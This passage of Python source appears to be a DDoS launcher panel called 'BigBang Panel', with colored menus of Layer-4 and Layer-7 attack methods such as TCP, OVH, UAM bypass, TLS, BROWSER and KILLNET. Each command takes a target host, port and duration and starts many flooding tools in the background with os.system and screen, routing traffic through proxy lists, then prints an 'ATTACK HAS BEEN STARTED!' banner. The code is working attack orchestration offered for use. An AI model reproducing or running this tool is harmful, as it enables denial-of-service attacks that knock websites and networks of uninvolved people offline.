          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
          os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm go run strike.go -url {host} POST')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS2 \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "bypass" or sinput == "BYPASS":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 100 GET proxy.txt 32')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mBYPASS \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "mix" or sinput == "MIX":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
          os.system(f'cd .SUDANC && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 64')
          os.system(f'cd .SUDAN && screen -dm node OVER2.js {host} {time} 10 proxy.txt 64 10')
          os.system(f'cd .SUDANC && screen -dm node OVER5.js {host} {time} 8 1 proxy.txt')
          os.system(f'cd .SUDAN && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
          os.system(f'cd .SUDANC && screen -dm node OVER6.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd /media && screen -dm node OVER.js {host} 32 {time}')
          os.system(f'cd /media && screen -dm node OVER2.js {host} {time} 10 proxy.txt 32 10')
          os.system(f'cd /media && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
          os.system(f'cd /media && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 32')
          os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mMIX \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()			    
      elif sinput == "bot2" or sinput == "BOT2":
        try:
          host = sin.split()[1]
          time = sin.split()[2]
          os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
          os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')	
          os.system(f'cd /media && screen -dm node OVER.js {host} 16 {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mBOT2 \033[35m]
  \033[1;37m                LAYER-12 : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()			    
      elif sinput == "browser" or sinput == "BROWSER":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .BF && screen -dm ./BROWSER {host} {time} 64 10')
          os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
          os.system(f'cd .BF && screen -dm node BROWSER3.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .BF2 && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .BF3 && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .BF3 && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 3 500')	
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 5 500')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd /media && screen -dm ./BROWSER {host} {time} 64 10')
          os.system(f'cd /media && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd /media && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd /media && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')	
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mBROWSER \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "killnet" or sinput == "KILLNET":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
          os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
          os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
          os.system(f'cd .randomstring && cd examples && screen -dm java input2.java {host} 8000')
          os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
          os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm ./tls {host} {time} 64 3 500')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system(f'cd /media && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
          os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 64 1')
          os.system(f'cd /media && screen -dm node HTTP.js {host} 500 5 {time}')
          os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[1;37mKILLNET \033[35m]
  \033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()			    			    
      elif sinput == "uam" or sinput == "UAM":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7   : \033[35m[ \033[1;37mUAM \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()





  def login():
      os.system("clear")
      user = "root"
      passwd = "23"
      username = input("what is your usrname")
      print("WELLCOME TO Ddos by Billz lulzsec")
      time.sleep(0.3)
      menu()
      main()


  login()



if pilih == "1":
  print("ingat ingat password ini")
  print("username root")
  print("password 28")

  # -*- coding: utf-8 -*-
  from operator import index
  import socket
  import random
  import string
  import threading
  import getpass
  import urllib
  import getpass
  from colorama import Fore, Back
  import os,sys,time,re,requests,json
  from requests import post
  from time import sleep
  from datetime import datetime, date
  import codecs

  B = '\033[35m' #MERAH
  P = '\033[1;37m' #PUTIH

  def layer7():
    os.system ("clear")
    print("""
  \033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
  \033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
  \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
  \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ LAYER - 7 ]
  \033[35mNOTE USE:
  METHODE [URL] [PORT] [TIME]

  \033[37m – STRIKE   – TLSV3 
   – BOMB2    – JAVA
   – BOMB     – HTTP
   – GOLDEN   – MIX
   – UAM 
   – TLS 
   – TLSV2

  """)

  def layer12():
    os.system ("clear")
    print("""
  \033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
  \033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
  \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
  \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ LAYER - 12 ]
  \033[35mUSE FOR BOT COUNT

  \033[37m– BRUTAL [url] [time]
  – BOT [url] [time]
  – BOT2 [url] [time]

  """)

  def VVIP():
    os.system ("clear")
    print("""
  \033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BILL PANEL
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ VVIP ]
  \033[35mNOTE USE:
  METHODE [URL] [PORT] [TIME]

  \033[37m– HTTPS
  – HTTPS2
  – BYPASS
  – BROWSER
  – KILLNET

  """)

  def layer4():
    os.system ("clear")
    print("""
  \033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
  \033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
  \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
  \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ LAYER - 4 ]
  \033[35mNOTE USE: 
  mode   [1/2/3]
  method [GET/POST/HEAD]


  \033[37m – STRESS [ip] [port] [mode] [time]
   – TCP [ip] [port] [time] [method]
   – OVH [ip] [port] [time] [method]


  """)    

  def help():
    os.system ("clear")
    print("""
  \033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
  \033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
  \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
  \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ MENU BIGBANG-PANNEL ]
  HOW TO USE TYPE L7 OR L4 TO SEE COMMANDS

  [LAYER-7]       [LAYER-4]       [LAYER-12]      [VVIP]
  \033[35m• STRIKE        • STRESS        • BRUTAL        • HTTPS [\033[32mVVIP\033[35m]
  • BOMB2         • TCP           • BOT           • HTTPS2 [\033[32mVVIP\033[35m]
  • BOMB          • OVH           • BOT2 [\033[32mVIP\033[35m]    • BYPASS [\033[32mVVIP\033[35m]
  • GOLDEN                                        • BROWSER [\033[32mVVIP\033[35m]
  • UAM                                           • KILLNET [\033[32mVVIP\033[35m]
  • TLS [\033[32mVIP\033[35m]
  • TLSV2 [\033[32mVIP\033[35m]
  • TLSV3 [\033[32mVIP\033[35m]
  • JAVA
  • HTTP [\033[32mVIP\033[35m]
  • MIX [\033[32mVIP\033[35m]

  """)

  def menu():
      os.system ("clear")
      print("""
  \033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
  \033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
  \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
  \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'


  \x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " HELP " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
  """)



  def main():

    while True:
      sys.stdout.write(f"\x1b]2;[/] BigBang Pannel :: Server Online 500 :: Online 1 :: Running: 0/10\x07")
      sin = input("\033[0;30;45mBigBang@PANNEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m ")
      sinput = sin.split(" ")[0]
      if sinput == "clear":
        os.system ("clear")
        menu()
      if sinput == "cls" or sinput == "CLS":
        os.system ("pkill screen")
        os.system ("clear")
        menu()
      if sinput == "stop" or sinput == "STOP":
        os.system ("pkill screen")
        menu()			
      if sinput == "layer12" or sinput == "l12" or sinput == ".layer12" or sinput == "LAYER12" or sinput == ".LAYER12" or sinput == "L12":
        layer12()
      if sinput == "vvip" or sinput == "vip" or sinput == ".vvip" or sinput == "VVIP" or sinput == ".VVIP" or sinput == "VIP":
        VVIP()
      if sinput == "layer7" or sinput == "l7" or sinput == ".layer7" or sinput == "LAYER7" or sinput == ".LAYER7" or sinput == "L7":
        layer7()
      if sinput == "layer4" or sinput == "l4" or sinput == ".layer4" or sinput == "LAYER4" or sinput == ".LAYER4" or sinput == "L4":
        layer4()
      if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
        help()
      if sinput == "plan":
        plant()
      elif sinput == "":
        main()

  #########LAYER-4########
      elif sinput == "stress" or sinput == "STRESS":
        try:
          ip = sin.split()[1]
          port = sin.split()[2]
          method = sin.split()[3]
          time = sin.split()[4]
          os.system(f'cd .resources && go run stress.go {ip} {port} {method} 1250 {time} 5')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
  \033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mSTRESSER \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tcp" or sinput == "TCP":
        try:
          ip = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          method = sin.split()[4]
          os.system(f'cd .resources && screen -dm ./TCP {method} {ip} {port} {time} 15000')
          os.system(f'cd .TC1 && screen -dm ./TCP {method} {ip} {port} {time} 7000')
          os.system(f'cd .TC2 && screen -dm ./TCP {method} {ip} {port} {time} 10000')
          os.system(f'cd .resources && screen -dm./RAW {method} {ip} {port} {time} 15000')
          os.system(f'cd .TC1 && screen -dm ./RAW {method} {ip} {port} {time} 7000')
          os.system(f'cd .TC2 && screen -dm ./RAW {method} {ip} {port} {time} 10000')
          os.system(f'cd /media && screen -dm ./RAW {method} {ip} {port} {time} 7000')
          os.system(f'cd /media && screen -dm ./TCP {method} {ip} {port} {time} 7000')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mTCP \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "ovh" or sinput == "OVH":
        try:
          ip = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          method = sin.split()[4]
          os.system(f'cd .resources && ./RAW {method} {ip} {port} {time} 15000')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mOVH \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()

  #########LAYER-7########  
      elif sinput == "strike" or sinput == "STRIKE":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm go run strike.go -url {host} GET')
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 8 1')
          os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 8 1')
          os.system(f'cd /media && screen -dm go run strike.go -url {host} GET')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mSTRIKE \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "java" or sinput == "JAVA":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .randomstring && cd examples && java input2.java {host} 8000')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mJAVA \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tls" or sinput == "TLS":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 45 5 500')
          os.system ("clear")
          print(f"""
